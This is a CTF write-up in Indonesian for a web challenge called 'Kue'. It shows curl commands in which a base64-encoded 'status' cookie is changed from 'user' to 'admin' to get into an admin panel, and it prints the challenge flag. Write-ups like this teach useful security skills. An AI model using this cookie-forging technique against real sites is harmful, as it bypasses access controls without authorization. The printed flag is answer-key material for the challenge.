# __ASGama CTF__ 
## _Kue_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 20 | l0l

**Description:** 

> http://ctf.asgama.web.id:40103


### Kue
Dari judul soal sudah cukup jelas bahwa soal ini berhubungan dengan cookie. Coba akses dengan curl.
```html
* Rebuilt URL to: http://ctf.asgama.web.id:40103/
*   Trying 202.43.92.132...
* TCP_NODELAY set
* Connected to ctf.asgama.web.id (202.43.92.132) port 40103 (#0)
> GET / HTTP/1.1
> Host: ctf.asgama.web.id:40103
> User-Agent: curl/7.58.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Host: ctf.asgama.web.id:40103
< Date: Fri, 28 Dec 2018 15:07:10 +0000
< Connection: close
< X-Powered-By: PHP/7.2.6
< Set-Cookie: status=dXNlcg%3D%3D; expires=Sun, 27-Jan-2019 15:07:10 GMT; Max-Age=2592000; path=/
< Content-type: text/html; charset=UTF-8
< 

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Admin Panel</title>
</head>
<body>
    <h1>Admin Panel</h1>
    Stop, anda bukan admin.</body>
</html>
* Closing connection 0
```

Pada bagian cookie terdapat value dXNlcg%3D%3D yang sama dengan dXNlcg==. 
```
$ echo dXNlcg== | base64 -d
user
```

Tinggal akses dengan set cookie status menjadi base64 dari admin.
```
echo -ne admin | base64
YWRtaW4=
```



### Payload
```
curl --cookie "status"="YWRtaW4=" http://ctf.asgama.web.id:40103 
```

### Result
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Admin Panel</title>
</head>
<body>
    <h1>Admin Panel</h1>
    GamaCTF{c00k13_b4h4y4}</body>
</html>
```

### Flag
GamaCTF{c00k13_b4h4y4}